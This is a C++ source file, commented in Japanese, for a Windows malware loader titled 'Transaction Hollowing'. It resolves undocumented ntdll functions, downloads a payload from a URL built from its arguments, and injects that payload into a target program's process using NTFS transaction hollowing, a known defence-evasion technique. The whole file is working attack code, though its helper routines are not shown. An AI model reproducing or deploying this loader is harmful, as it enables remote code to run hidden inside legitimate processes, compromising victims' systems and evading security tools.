// トランザクションハロウィング

#include "TransactionHollowing.h"

Arg arg;

pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateProcessEx");
pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");
pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection");
pNtSetInformationFile NtSetInformationFile = (pNtSetInformationFile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtSetInformationFile");
pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlCreateProcessParametersEx");
pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapViewOfSection");
pCreateProcessInternalW CreateProcessInternalW = (pCreateProcessInternalW)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateProcessInternalW");

// エントリポイント
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    // URLを構築
    std::wstring url = makeUrl(arg);

    // ファイルサーバーからペイロードをステージング
    std::vector<BYTE> payload;
    StagingPayload(url, payload);

    // NTFSTransactionHollowingでペイロードを実行
    TransactionNTFSHollowing(arg.targetProgramPath, payload.data(), payload.size());

    return 0;
}